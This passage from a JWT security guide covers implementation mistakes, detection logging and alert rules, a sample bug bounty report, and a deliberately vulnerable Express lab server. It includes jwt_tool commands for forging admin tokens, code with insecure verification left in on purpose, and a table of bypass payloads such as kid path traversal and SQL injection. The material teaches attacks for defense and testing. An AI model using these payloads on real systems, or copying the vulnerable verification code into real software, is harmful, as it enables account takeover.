8. **Not implementing token revocation**. No blocklist, no database check, no way to invalidate a compromised token.

9. **Exposing tokens in URLs**. Query parameter tokens appear in logs, Referer headers, and browser history.

10. **Using JWT for sessions when simple session cookies would suffice**. JWTs add complexity. If you need server-side revocation anyway, you have re-invented sessions with extra steps and more attack surface.

---

## 14. Detection Strategies

### Server-Side Logging

```javascript
// Log JWT verification failures with context
function authenticateToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  try {
    req.user = jwt.verify(token, SECRET, { algorithms: ['HS256'] });
    next();
  } catch (err) {
    const decoded = jwt.decode(token, { complete: true });
    logger.warn('JWT verification failed', {
      error: err.message,
      algorithm: decoded?.header?.alg,
      kid: decoded?.header?.kid,
      hasJwk: !!decoded?.header?.jwk,
      claimedUserId: decoded?.payload?.user_id,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      timestamp: new Date().toISOString()
    });
    res.status(401).json({ error: 'Unauthorized' });
  }
}
```

### Alerts to Trigger

- Tokens with `alg: none` (any case variation).
- Tokens with `alg: HS256` when the server uses RS256.
- Tokens with `jwk` or `jku` in the header.
- Tokens with `kid` values containing path separators, SQL syntax, or shell metacharacters.
- High rate of verification failures from a single IP.
- Valid tokens used after the associated user's password change.

### AWS CloudWatch Metric Filter

```
# Filter for JWT attack attempts in application logs
{ $.message = "JWT verification failed" && ($.algorithm = "none" || $.algorithm = "HS256" || $.hasJwk = true) }
```

---

## 15. Bug Bounty Report Example

```
## Title
JWT Algorithm Confusion Allows Full Account Takeover on api.target.com

## Severity
Critical (CVSS 9.8)

## Affected Endpoint
All authenticated API endpoints on api.target.com

## Summary
The JWT verification on api.target.com does not restrict the signing algorithm.
An attacker can change the algorithm from RS256 to HS256 and sign the token
using the publicly available RSA public key as the HMAC secret. This allows
forging valid tokens for any user, including administrators.

## Steps to Reproduce

1. Obtain the public key:
   curl -s https://target.com/.well-known/jwks.json > jwks.json
   python3 jwt_tool.py <token> -V -jw jwks.json
   # Save extracted public key as public.pem

2. Authenticate as a low-privilege user and capture the JWT from the
   Authorization header.

3. Execute algorithm confusion attack:
   python3 jwt_tool.py <captured_token> -X k -pk public.pem -pc role -pv admin -pc user_id -pv 1

4. Use the forged token:
   curl -H "Authorization: Bearer <forged_token>" https://api.target.com/admin/users
   # Returns full admin dashboard with all user data

## Impact
- Complete authentication bypass
- Privilege escalation to administrator
- Access to all user data (PII, payment information)
- Ability to modify any user account
- Full administrative control of the application

## Remediation
Add explicit algorithm restriction to all jwt.verify() calls:
jwt.verify(token, publicKey, { algorithms: ['RS256'] })

## Proof of Concept
[Attached: video recording, forged token sample, full HTTP request/response logs]
```

---

## 16. Lab Setup

### Docker-Based Vulnerable JWT Lab

```yaml
# docker-compose.yml
version: '3.8'
services:
  vulnerable-api:
    build: .
    ports:
      - "3000:3000"
    environment:
      - JWT_SECRET=secret123
      - JWT_PUBLIC_KEY_FILE=/app/keys/public.pem
      - JWT_PRIVATE_KEY_FILE=/app/keys/private.pem
    volumes:
      - ./keys:/app/keys

  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
```

```javascript
// Intentionally vulnerable server for practicing JWT attacks
const express = require('express');
const jwt = require('jsonwebtoken');
const fs = require('fs');

const app = express();
app.use(express.json());

const HMAC_SECRET = 'secret123'; // Weak secret (crackable)
const RSA_PRIVATE = fs.readFileSync('./keys/private.pem');
const RSA_PUBLIC = fs.readFileSync('./keys/public.pem');

const users = [
  { id: 1, username: 'admin', password: 'admin123', role: 'admin' },
  { id: 2, username: 'user', password: 'user123', role: 'user' },
];

// Login endpoint - choose algorithm via query param
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const algo = req.query.algo || 'hs256';
  const user = users.find(u => u.username === username && u.password === password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  let token;
  if (algo === 'rs256') {
    token = jwt.sign({ user_id: user.id, role: user.role }, RSA_PRIVATE, {
      algorithm: 'RS256', expiresIn: '1h'
    });
  } else {
    token = jwt.sign({ user_id: user.id, role: user.role }, HMAC_SECRET, {
      algorithm: 'HS256', expiresIn: '1h'
    });
  }

  res.json({ token });
});

// VULNERABLE: No algorithm restriction, no kid sanitization
app.get('/profile', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });

  try {
    const header = jwt.decode(token, { complete: true })?.header;
    let key = HMAC_SECRET;

    if (header?.alg?.startsWith('RS') || header?.alg?.startsWith('PS')) {
      key = RSA_PUBLIC;
    }

    // Vulnerable: trusts header.jwk
    if (header?.jwk) {
      const jwkKey = require('crypto').createPublicKey({ key: header.jwk, format: 'jwk' });
      key = jwkKey;
    }

    // Vulnerable: kid path traversal
    if (header?.kid) {
      try {
        key = fs.readFileSync(`./keys/${header.kid}`);
      } catch (e) { /* fall back to default */ }
    }

    const decoded = jwt.verify(token, key); // No algorithm restriction!
    res.json({ user: decoded });
  } catch (err) {
    res.status(401).json({ error: 'Invalid token', details: err.message });
  }
});

app.listen(3000, () => console.log('Vulnerable JWT lab running on :3000'));
```

Generate keys for the lab:

```bash
# Generate RSA key pair
openssl genrsa -out keys/private.pem 2048
openssl rsa -in keys/private.pem -pubout -out keys/public.pem
```

### Additional Practice Resources

- **PortSwigger Web Security Academy**: JWT labs covering all attack classes.
- **OWASP Juice Shop**: Has JWT-related challenges.
- **Damn Vulnerable Web Application (DVWA)**: Add JWT module.
- **jwt_tool's own test environment**: Included in the repository.

---

## 17. Common Bypass Techniques Summary

| Technique | Bypasses | Payload |
|---|---|---|
| `alg: none` (case variants) | Naive none-check filters | `None`, `NONE`, `nOnE` |
| Algorithm confusion | RS256-only servers without algo restriction | Change `alg` to `HS256`, sign with public key |
| JWK injection | Servers that trust embedded keys | Embed attacker's public key in header |
| `kid` path traversal | Key lookup via file system | `../../dev/null`, sign with empty secret |
| `kid` SQLi | Key lookup via database | `' UNION SELECT 'secret' --` |
| Empty signature | Missing length check on signature | Keep header and payload, set signature to empty |
| Unicode null in alg | String comparison bypass | `"alg": "HS256\u0000ignore"` |
| `jku` header injection | Servers that fetch keys from header URL | Point `jku` to attacker-controlled JWKS endpoint |
| `x5u` header injection | Servers that fetch certs from header URL | Point `x5u` to attacker-controlled X.509 cert |
| Token in Referer | WAF that only checks Authorization header | Move token to cookie or query param |

---

## Conclusion

JWT security is not a single checkbox. It is a matrix of implementation decisions, each with its own failure modes. The attacks in this article -- from brute-forcing weak secrets to injecting SQL through `kid` parameters -- are not theoretical. They are found regularly in production applications, in bug bounty programs, and in penetration tests.

The core defenses are straightforward: always specify allowed algorithms explicitly, use cryptographically strong secrets (or asymmetric keys), validate all header parameters against allowlists, implement token revocation, use short-lived tokens with refresh rotation, and store tokens securely. The difficulty is not in knowing these defenses -- it is in applying every single one consistently across every endpoint, every microservice, and every library upgrade.

When testing JWT implementations, approach them systematically. Start with reconnaissance (what algorithm, what claims, what transport), then test each attack class methodically. Tools like jwt_tool and the Burp Suite JWT Editor extension make this workflow efficient, but understanding the underlying mechanics is what separates a scanner operator from a researcher who finds the vulnerabilities that scanners miss.

The next time you see a JWT in a target application, do not just decode it and move on. Treat it as an attack surface -- because it is.

---

*If you found this guide useful, share it with your team. The best way to prevent JWT attacks is to ensure every developer who touches authentication code understands how these attacks work. Test your own applications before someone else does.*
